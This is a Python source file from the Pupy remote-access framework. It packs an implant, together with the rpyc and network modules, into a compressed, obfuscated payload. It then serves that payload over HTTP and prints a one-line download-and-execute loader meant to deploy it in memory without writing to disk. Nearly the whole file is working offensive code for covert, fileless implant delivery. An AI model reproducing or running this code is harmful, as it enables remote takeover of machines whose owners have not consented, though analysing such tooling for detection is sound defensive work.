#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import cPickle, re, os.path
import rpyc
from pupylib.utils.obfuscate import compress_encode_obfs
from pupylib.utils.term import colorize
from pupylib.utils.network import get_local_ip

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

def get_load_module_code(code, modulename):
	loader="""
import imp, sys
fullname={}
mod = imp.new_module(fullname)
mod.__file__ = "<bootloader>\\%s" % fullname
exec {} in mod.__dict__
sys.modules[fullname]=mod
	""".format(repr(modulename),repr(code))
	return loader

def gen_package_pickled_dic(path, module_name):
	modules_dic={}
	start_path=module_name.replace(".", "/")
	search_path=os.path.dirname(path)
	print "embedding %s ..."%os.path.join(search_path, start_path)
	for root, dirs, files in os.walk(os.path.join(search_path, start_path)):
		for f in files:
			module_code=""
			with open(os.path.join(root,f),'rb') as fd:
				module_code=fd.read()
			modprefix = root[len(search_path.rstrip(os.sep))+1:]
			modpath = os.path.join(modprefix,f).replace("\\","/")
			modules_dic[modpath]=module_code
	return modules_dic


def pack_py_payload(conf):
	print colorize("[+] ","green")+"generating payload ..."
	fullpayload=[]

	with open(os.path.join(ROOT,"packages","all", "pupyimporter.py")) as f:
		pupyimportercode=f.read()
	fullpayload.append(get_load_module_code(pupyimportercode,"pupyimporter")+"\n")

	modules_dic=gen_package_pickled_dic(rpyc.__path__[0],"rpyc")
	fullpayload.append("import pupyimporter\npupyimporter.install()\npupyimporter.pupy_add_package(%s)\nimport rpyc"%repr(cPickle.dumps(modules_dic)))

	modules_dic=gen_package_pickled_dic(os.path.join(ROOT,"network"),"network")
	fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))

	with open(os.path.join(ROOT,"pp.py")) as f:
		code=f.read()
	code=re.sub(r"LAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
	fullpayload.append(code+"\n")
	
	return compress_encode_obfs('\n'.join(fullpayload)+"\n")


def serve_payload(payload, ip="0.0.0.0", port=8080):
	print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
	print " --- "
	oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(get_local_ip(), port), "green")
	print oneliner
	print " --- "
	class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
		def do_GET(self):
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.end_headers()
			# Send the html message
			self.wfile.write(payload)
			return
	try:
		server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
		print colorize("[+] ","green")+'Started httpserver on port ' , port
		print colorize("[+] ","green")+'waiting for a connection ...'
		server.serve_forever()
	except KeyboardInterrupt:
		print 'KeyboardInterrupt received, shutting down the web server'
		server.socket.close()
		exit()


